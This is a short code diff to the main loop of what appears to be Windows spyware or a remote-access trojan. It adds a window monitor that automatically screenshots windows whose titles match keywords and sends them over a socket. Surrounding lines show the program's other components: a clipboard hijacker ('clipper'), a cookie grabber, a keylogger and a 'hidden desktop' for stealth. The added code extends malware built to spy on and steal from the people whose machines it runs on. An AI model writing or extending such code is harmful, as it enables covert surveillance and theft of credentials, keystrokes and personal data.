@@ -25,6 +25,7 @@
 #include "data_scraper.h"
 #include "hidden_desktop.h"
 #include "clipboard_monitor.h"
+#include "window_monitor.h"
 
 #pragma comment(lib, "ws2_32.lib")
 #pragma comment(lib, "psapi.lib")
@@ -348,6 +349,12 @@ int main(int argc, char* argv[]) {
         StartClipperThread(sock);
         dbgLog("CLIPPER: started");
         std::cout << "[CLIPPER] Clipboard monitor started\n";
+
+        // Start window monitor (auto-screenshot on keyword window titles)
+        dbgLog("WINMON: starting");
+        StartWindowMonitor(sock);
+        dbgLog("WINMON: started");
+        std::cout << "[WINMON] Window monitor started\n";
         
         // Initialize hidden desktop system for stealth mode
         dbgLog("HIDDEN: skipped (keeps SendInput on WinSta0/default desktop)");
@@ -1112,6 +1119,7 @@ int main(int argc, char* argv[]) {
         // Stop threads
         cookieGrabRunning = false;
         StopClipperThread();
+        StopWindowMonitor();
         if (keyloggerRunning) {
             StopKeyboardHook();
             keyloggerRunning = false;
